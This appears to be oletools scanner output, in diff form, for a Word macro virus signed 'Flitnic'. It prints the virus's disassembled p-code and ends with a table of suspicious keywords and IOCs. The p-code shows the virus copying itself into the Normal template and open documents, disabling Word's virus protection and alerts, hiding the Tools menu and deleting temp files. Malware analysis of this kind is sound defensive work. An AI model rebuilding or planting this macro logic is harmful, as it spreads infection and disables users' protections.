+' 	BoSImplicit 
+' 	LitStr 0x0009 "C:\Vd.dll"
+' 	St IW 
+' 	EndIf 
+' Line #478:
+' 	Ld IW 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #479:
+' 	LitStr 0x001B "Private Sub Document_Open()"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St FullCode 
+' Line #480:
+' 	Do 
+' Line #481:
+' 	LitDI2 0x0001 
+' 	Ld VirCode 
+' 	LineInput 
+' Line #482:
+' 	Ld VirCode 
+' 	LitStr 0x001B "Private Sub Document_Open()"
+' 	Eq 
+' 	LoopUntil 
+' Line #483:
+' 	Do 
+' Line #484:
+' 	Ld VirCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld ess 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St ess 
+' 	EndIf 
+' Line #485:
+' 	Ld ess 
+' 	LitDI2 0x0003 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo jump 
+' 	EndIf 
+' Line #486:
+' 	LitDI2 0x0001 
+' 	Ld VirCode 
+' 	LineInput 
+' Line #487:
+' 	Ld VirCode 
+' 	LitStr 0x0016 "Rem Written by Flitnic"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo jump 
+' 	EndIf 
+' Line #488:
+' 	Ld FullCode 
+' 	Ld VirCode 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St FullCode 
+' Line #489:
+' 	Loop 
+' Line #490:
+' 	Label jump 
+' Line #491:
+' 	Ld FullCode 
+' 	Ld VirCode 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St FullCode 
+' Line #492:
+' 	Ld FullCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Concat 
+' 	St FullCode 
+' Line #493:
+' 	Ld NormInstalled 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #494:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #495:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo AtrNo 
+' 	EndIf 
+' Line #496:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #497:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #498:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	IfBlock 
+' Line #499:
+' 	CloseAll 
+' Line #500:
+' 	ExitSub 
+' Line #501:
+' 	EndIfBlock 
+' Line #502:
+' 	Label AtrNo 
+' Line #503:
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St Lines 
+' Line #504:
+' 	LitDI2 0x0001 
+' 	Ld Lines 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #505:
+' 	LitDI2 0x0001 
+' 	Ld FullCode 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #506:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #507:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #508:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #509:
+' 	EndIfBlock 
+' Line #510:
+' 	Ld ActInstalled 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #511:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 "\"
+' 	Eq 
+' 	IfBlock 
+' Line #512:
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St Lines 
+' Line #513:
+' 	LitDI2 0x0001 
+' 	Ld Lines 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #514:
+' 	LitDI2 0x0001 
+' 	Ld FullCode 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #515:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #516:
+' 	ElseBlock 
+' Line #517:
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St Lines 
+' Line #518:
+' 	LitDI2 0x0001 
+' 	Ld Lines 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #519:
+' 	LitDI2 0x0001 
+' 	Ld FullCode 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #520:
+' 	EndIfBlock 
+' Line #521:
+' 	EndIfBlock 
+' Line #522:
+' 	Label esub 
+' Line #523:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St a 
+' Line #524:
+' 	Ld a 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #525:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #526:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #527:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #528:
+' 	CloseAll 
+' Line #529:
+' 	LitStr 0x0009 "c:\vn.dll"
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #530:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo tz2a 
+' 	EndIf 
+' Line #531:
+' 	LitStr 0x0009 "C:\vn.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #532:
+' 	Label tz2a 
+' Line #533:
+' 	LitStr 0x0009 "c:\vd.dll"
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #534:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo tz2b 
+' 	EndIf 
+' Line #535:
+' 	LitStr 0x0009 "C:\vd.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #536:
+' 	Label tz2b 
+' Line #537:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 "\"
+' 	Eq 
+' 	IfBlock 
+' Line #538:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #539:
+' 	EndIfBlock 
+' Line #540:
+' 	Ld windir 
+' 	LitStr 0x000F "\system\Log.drv"
+' 	Concat 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #541:
+' 	LitDI2 0x0001 
+' 	ArgsLd LOF 0x0001 
+' 	St lll 
+' Line #542:
+' 	QuoteRem 0x0000 0x001E "IIS for NormalTemplate Create:"
+' Line #543:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #544:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #545:
+' 	LitVarSpecial (False)
+' 	St aAutoOpen 
+' Line #546:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #547:
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld Ii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St a 
+' Line #548:
+' 	Ld a 
+' 	LitStr 0x0009 "Sub IIS()"
+' 	Eq 
+' 	IfBlock 
+' Line #549:
+' 	Ld Ii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #550:
+' 	LitDI2 0x0001 
+' 	Ld cl 
+' 	Ld Ii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #551:
+' 	LitVarSpecial (True)
+' 	St aAutoOpen 
+' Line #552:
+' 	ExitFor 
+' Line #553:
+' 	EndIfBlock 
+' Line #554:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #555:
+' 	LitDI2 0x0000 
+' 	St Ii 
+' Line #556:
+' 	Ld aAutoOpen 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #557:
+' 	CloseAll 
+' Line #558:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #559:
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0014 "Attribute VB_Name = "
+' 	PrintItemSemi 
+' 	Ld XXXXX 
+' 	PrintItemSemi 
+' 	LitStr 0x0000 ""
+' 	PrintItemNL 
+' Line #560:
+' 	CloseAll 
+' Line #561:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	Paren 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemCall Import 0x0001 
+' Line #562:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #563:
+' 	EndIfBlock 
+' Line #564:
+' 	LitDI2 0x0000 
+' 	St iii 
+' Line #565:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #566:
+' 	Ld iii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #567:
+' 	Ld cl 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitFor 
+' 	EndIf 
+' Line #568:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #569:
+' 	LitStr 0x0009 "Sub IIS()"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #570:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0012 "'Macro created by "
+' 	Concat 
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #571:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #572:
+' 	LitDI2 0x0001 
+' 	Ld AutoOpenCode 
+' 	Ld iii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #573:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #574:
+' 	QuoteRem 0x0000 0x001E "IIS for ActiveDocument Create:"
+' Line #575:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	ArgsLd LCase 0x0001 
+' 	LitStr 0x0001 "a"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo nomacro 
+' 	EndIf 
+' Line #576:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #577:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #578:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo nomacro 
+' 	EndIf 
+' Line #579:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 "\"
+' 	Eq 
+' 	IfBlock 
+' Line #580:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #581:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #582:
+' 	LitVarSpecial (False)
+' 	St aAutoOpen 
+' Line #583:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #584:
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld Ii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St a 
+' Line #585:
+' 	Ld a 
+' 	LitStr 0x0009 "Sub IIS()"
+' 	Eq 
+' 	IfBlock 
+' Line #586:
+' 	Ld Ii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #587:
+' 	LitDI2 0x0001 
+' 	Ld cl 
+' 	Ld Ii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #588:
+' 	LitVarSpecial (True)
+' 	St aAutoOpen 
+' Line #589:
+' 	ExitFor 
+' Line #590:
+' 	EndIfBlock 
+' Line #591:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #592:
+' 	LitDI2 0x0000 
+' 	St Ii 
+' Line #593:
+' 	Ld aAutoOpen 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #594:
+' 	CloseAll 
+' Line #595:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #596:
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0014 "Attribute VB_Name = "
+' 	PrintItemSemi 
+' 	Ld XXXXX 
+' 	PrintItemSemi 
+' 	LitStr 0x0000 ""
+' 	PrintItemNL 
+' Line #597:
+' 	CloseAll 
+' Line #598:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	Paren 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemCall Import 0x0001 
+' Line #599:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #600:
+' 	EndIfBlock 
+' Line #601:
+' 	LitDI2 0x0000 
+' 	St iii 
+' Line #602:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #603:
+' 	Ld iii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #604:
+' 	Ld cl 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitFor 
+' 	EndIf 
+' Line #605:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #606:
+' 	LitStr 0x0009 "Sub IIS()"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #607:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0012 "'Macro created by "
+' 	Concat 
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #608:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #609:
+' 	LitDI2 0x0001 
+' 	Ld AutoOpenCode 
+' 	Ld iii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #610:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #611:
+' 	EndIfBlock 
+' Line #612:
+' 	Label nomacro 
+' Line #613:
+' Line #614:
+' 	CloseAll 
+' Line #615:
+' 	Label MegaJump 
+' Line #616:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #617:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #618:
+' 	OnError (Resume Next) 
+' Line #619:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	Ld vbReadOnly 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #620:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #621:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #622:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #623:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #624:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt SaveNormalPrompt 
+' Line #625:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #626:
+' 	LitVarSpecial (False)
+' 	Ld Application 
+' 	MemSt DisplayStatusBar 
+' Line #627:
+' 	LitVarSpecial (False)
+' 	Ld Application 
+' 	MemSt DisplayAlerts 
+' Line #628:
+' 	LitVarSpecial (False)
+' 	LitDI2 0x0003 
+' 	LitDI2 0x000C 
+' 	LitStr 0x0005 "Tools"
+' 	Ld Application 
+' 	ArgsMemLd CommandBars 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	MemSt Visible 
+' Line #629:
+' Line #630:
+' 	QuoteRem 0x0000 0x0020 "Insert destruction routine here:"
+' Line #631:
+' Line #632:
+' 	Label gghh 
+' Line #633:
+' 	Rem 0x0013 " Written by Flitnic"
+' Line #634:
+' 	EndSub 
+' Macros/VBA/Module1 - 881 bytes
+' Line #0:
+' 	FuncDefn (Sub IIS())
+' Line #1:
+' 	QuoteRem 0x0000 0x0016 "Macro created by MACRO"
+' Line #2:
+' 	EndSub 
+' Line #3:
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Autoexec            |Runs when the Word document is opened        |
+|AutoExec  |Document_Close      |Runs when the Word document is closed        |
+|AutoExec  |Document_New        |Runs when a new Word document is created     |
+|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Print #             |May write to a file (if combined with Open)  |
+|Suspicious|FileCopy            |May copy a file                              |
+|Suspicious|Kill                |May delete a file                            |
+|Suspicious|vbNormal            |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Create              |May execute file or a system command through |
+|          |                    |WMI                                          |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|system              |May run an executable file or a system       |
+|          |                    |command on a Mac (if combined with           |
+|          |                    |libc.dylib)                                  |
+|IOC       |vn.dll              |Executable file name                         |
+|IOC       |vd.dll              |Executable file name                         |
+|IOC       |Autoexec.bat        |Executable file name                         |
+|IOC       |Vd.dll              |Executable file name                         |
+|IOC       |autoexec.bat        |Executable file name                         |
+|IOC       |newvnb.dll          |Executable file name                         |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
